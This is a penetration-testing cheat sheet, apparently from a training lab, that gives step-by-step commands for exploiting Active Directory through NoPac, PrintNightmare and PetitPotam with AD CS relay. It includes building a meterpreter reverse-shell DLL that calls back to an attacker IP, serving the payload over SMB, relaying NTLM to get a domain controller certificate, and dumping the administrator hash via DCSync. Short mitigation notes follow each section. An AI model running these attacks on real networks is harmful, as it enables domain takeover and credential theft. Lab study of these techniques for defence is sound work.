# Active Directory CVE Exploitation
**Concept:** Unlike logic abuse (Kerberoasting), these attacks exploit patching gaps or protocol flaws. 
**Warning:** These exploits can be unstable. 
**PrintNightmare** in particular can crash the Print Spooler service or the entire DC (BSOD). Use with caution in production environments.
## 1. NoPac (SamAccountName Spoofing)
**CVEs:** CVE-2021-42278 & CVE-2021-42287 
**Concept:** By renaming a machine account to match a Domain Controller's name (minus the `$`), an attacker can trick the KDC into issuing a Ticket Granting Service (TGS) ticket for the DC itself. This grants Domain Admin privileges.
### Step 1: Tooling (Impacket & Exploit)
Ensure you have the correct version of Impacket and the exploit script.
```shell
# 1. Install Impacket
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && sudo python3 setup.py install

# 2. Get the Exploit
git clone https://github.com/Ridter/noPac.git
cd noPac
```
### Step 2: Validation (Scanner)
Check if the DC is vulnerable before launching the full attack.
```shell
# Syntax: scanner.py <Domain>/<User>:<Pass> -dc-ip <DC_IP> -use-ldap
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
### Step 3: Exploitation (Shell & DCSync)
If vulnerable, you can spawn a shell as `SYSTEM` or dump hashes directly (DCSync).

**Option A: Get a Shell**
```shell
# --impersonate administrator: Request a ticket as Admin
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

**Option B: DCSync (Dump Hashes)**
```shell
# -dump: Dump hashes via DRSUAPI
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

**Mitigation:**
- Patch DCs immediately. 
- Configure `KB5008380` (PacRequestorEnforcement).
## 2. PrintNightmare
**CVE:** CVE-2021-1675 / CVE-2021-34527 
**Concept:** The Windows Print Spooler service improperly validates file paths when installing drivers. Authenticated users can remotely load a malicious DLL, executing code as `SYSTEM` on the DC.
### Step 1: Tooling (Custom Impacket)
This exploit often requires a specific fork of Impacket to handle the MS-PAR/MS-RPRN protocols correctly.
```shell
# 1. Uninstall current Impacket
pip3 uninstall impacket

# 2. Install cube0x0's fork
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
### Step 2: Enumeration
Check if the Print Spooler is exposed via RPC.
```shell
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
# Success if you see: [MS-RPRN]: Print System Remote Protocol
```
### Step 3: Weaponization
1. **Generate Payload (DLL):**    
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
2. **Host Payload (SMB):** The DC must be able to pull the DLL from you.
```shell
# Create a share named 'CompData' hosting the DLL
sudo smbserver.py -smb2support CompData $(pwd)
```
3. **Start Listener (Metasploit):** Standard `multi/handler` with `windows/x64/meterpreter/reverse_tcp`.
### Step 4: Exploitation
Trigger the driver update to load your DLL.
```shell
# Syntax: python3 CVE-2021-1675.py <Domain>/<User>:<Pass>@<Target_IP> '<Share_Path>'
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
**Mitigation:**
- Disable the Print Spooler service on DCs (`Stop-Service Spooler`). 
- Disable "Allow Print Spooler to accept client connections" via GPO.
## 3. PetitPotam (AD CS Relay)
**Concept:** **PetitPotam** coerces a Windows host to authenticate to a machine of our choice. If we coerce a Domain Controller to authenticate to our **NTLM Relay**, and relay that to **Active Directory Certificate Services (AD CS)**, we can request a certificate as the DC. 
**Impact:** Using the DC's certificate, we can request a TGT and perform a DCSync.
### Step 1: Start the Relay (ntlmrelayx)
We listen for incoming connections and forward them to the AD CS Web Enrollment endpoint (`certsrv`).
```shell
# --template DomainController: Request a DC cert
# --adcs: Target is Active Directory Certificate Services
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
### Step 2: Trigger Coercion (PetitPotam)
Force the DC (`172.16.5.5`) to connect to our relay (`172.16.5.225`).
```shell
# Syntax: python3 PetitPotam.py <Attacker_IP> <Target_DC_IP>
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```
_Result:_ `ntlmrelayx` should capture the session and output a **Base64 Certificate**.
### Step 3: Convert Cert to Ticket (PKINIT)
Use the captured certificate to request a Kerberos TGT.
```shell
# Create a ccache file (ticket)
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE64_BLOB> dc01.ccache

# Import the ticket
export KRB5CCNAME=dc01.ccache
```
### Step 4: Domain Dominance (DCSync)
Now that we "are" the DC (via Kerberos), we can sync secrets.
```shell
# Dump the Administrator hash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
**Mitigation:**
- **Disable NTM** on AD CS servers (IIS).
- Enable **Extended Protection for Authentication (EPA)**.
- Block MS-EFSRPC (PetitPotam vector) using RPC filters.